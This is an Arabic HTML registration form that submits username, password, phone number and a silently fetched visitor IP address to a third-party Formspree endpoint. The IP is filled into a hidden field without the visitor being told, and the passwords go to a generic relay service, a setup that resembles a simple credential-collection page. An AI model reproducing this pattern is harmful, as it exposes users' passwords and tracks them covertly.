<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نموذج تسجيل جديد</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            /* خلفية متدرجة ملونة */
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
        }

        .contact-form {
            background-color: #ffffff;
            padding: 35px 25px;
            border-radius: 16px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            border-top: 5px solid #764ba2;
        }

        .contact-form h2 {
            color: #333;
            margin-bottom: 25px;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
        }

        .form-group {
            margin-bottom: 18px;
        }

        .form-group label {
            display: block;
            margin-bottom: 6px;
            color: #555;
            font-weight: 600;
            font-size: 14px;
        }

        /* تنسيق الحقول */
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.3s ease;
            font-family: inherit;
            background-color: #fafafa;
        }

        /* تأثير التوهج عند الكتابة */
        .form-group input:focus {
            outline: none;
            border-color: #667eea;
            background-color: #fff;
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.15);
        }

        /* زر الإرسال الملون */
        .submit-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(to right, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            margin-top: 15px;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(118, 75, 162, 0.4);
        }

        .submit-btn:active {
            transform: scale(0.98);
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- تم وضع الرابط الخاص بك هنا -->
        <form action="https://formspree.io/f/xjygjrzn" method="POST" class="contact-form" id="mainForm">
            <h2>تسجيل حساب جديد</h2>
            
            <!-- 1. اسم المستخدم -->
            <div class="form-group">
                <label for="username">👤 اسم المستخدم</label>
                <input type="text" id="username" name="username" placeholder="اكتب اسم المستخدم" required>
            </div>

            <!-- 2. كلمة المرور -->
            <div class="form-group">
                <label for="password">🔒 كلمة المرور</label>
                <input type="password" id="password" name="password" placeholder="********" required>
            </div>

            <!-- 3. تأكيد كلمة المرور -->
            <div class="form-group">
                <label for="confirm_password">🔐 تأكيد كلمة المرور</label>
                <input type="password" id="confirm_password" name="confirm_password" placeholder="********" required>
            </div>

            <!-- 4. رقم الجوال -->
            <div class="form-group">
                <label for="phone">📱 رقم الجوال</label>
                <input type="tel" id="phone" name="phone" placeholder="05xxxxxxxx" required>
            </div>

            <!-- 5. الـ IP (مخفي ويتم تعبئته تلقائياً) -->
            <input type="hidden" id="ip_address" name="ip_address">

            <button type="submit" class="submit-btn">إرسال البيانات</button>
        </form>
    </div>

    <script>
        // 1. جلب عنوان الـ IP الخاص بالزائر ووضعه في الحقل المخفي تلقائياً
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                document.getElementById('ip_address').value = data.ip;
            })
            .catch(error => console.log('لم نتمكن من جلب الـ IP:', error));

        // 2. التحقق من تطابق كلمتي المرور
        document.getElementById('mainForm').addEventListener('submit', function(e) {
            const pass = document.getElementById('password').value;
            const confirmPass = document.getElementById('confirm_password').value;
            
            if (pass !== confirmPass) {
                e.preventDefault(); // منع إرسال النموذج
                alert('⚠️ خطأ: كلمة المرور وتأكيد كلمة المرور غير متطابقين!');
            }
        });
    </script>

</body>
</html>
